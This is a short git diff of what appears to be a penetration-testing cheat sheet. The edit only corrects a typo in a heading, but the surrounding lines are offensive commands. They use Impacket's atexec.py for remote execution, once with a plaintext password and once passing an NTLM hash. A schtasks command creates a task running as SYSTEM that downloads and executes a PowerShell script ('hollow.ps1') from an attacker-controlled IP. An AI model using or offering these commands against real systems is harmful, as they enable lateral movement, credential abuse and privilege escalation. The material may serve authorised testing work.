@@ -126,7 +126,7 @@ NTLM Auth:
 - `atexec.py test.local/john:password123@10.10.10.1 whoami'`
 - `atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 test.local/john@10.10.10.1 whoami`
 
-# Escalate to SYSTEM via Schduele Task
+# Escalate to SYSTEM via Schedule Task
 - `schtasks /create /tn "SystemTask" /tr "powershell iex(iwr http://192.168.45.223/hollow.ps1 -useb)" /sc once /st 00:00 /ru SYSTEM`
 
 - `schtasks /run /tn "SystemTask"`
